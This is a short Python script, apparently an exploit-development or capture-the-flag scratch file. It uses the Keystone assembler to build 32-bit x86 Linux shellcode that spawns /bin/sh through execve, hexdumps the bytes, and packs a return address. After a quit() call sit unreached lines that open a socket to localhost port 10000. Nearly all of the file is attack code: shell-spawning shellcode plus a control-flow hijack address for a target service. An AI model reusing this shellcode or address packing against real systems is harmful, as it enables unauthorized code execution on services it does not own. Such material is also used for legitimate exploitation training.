#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import struct
from keystone import *
from hexdump import hexdump

shellcode = """\
xor     eax, eax
push    eax
push    0x68732f2f
push    0x6e69622f
mov     ebx, esp
mov     ecx, eax
mov     edx, eax
mov     al, 0x0b
int     0x80
xor     eax, eax
inc     eax
int     0x80
"""

try:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(shellcode)
except KsError as e:
    print("ERROR: %s" % e)

print 'shellcode:'
shellcode_buf = ''.join([chr(x) for x in encoding])
hexdump(shellcode_buf)

print 'addr:'
addr = struct.pack('!I', 0x08048060)
hexdump(addr)

quit()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10000))

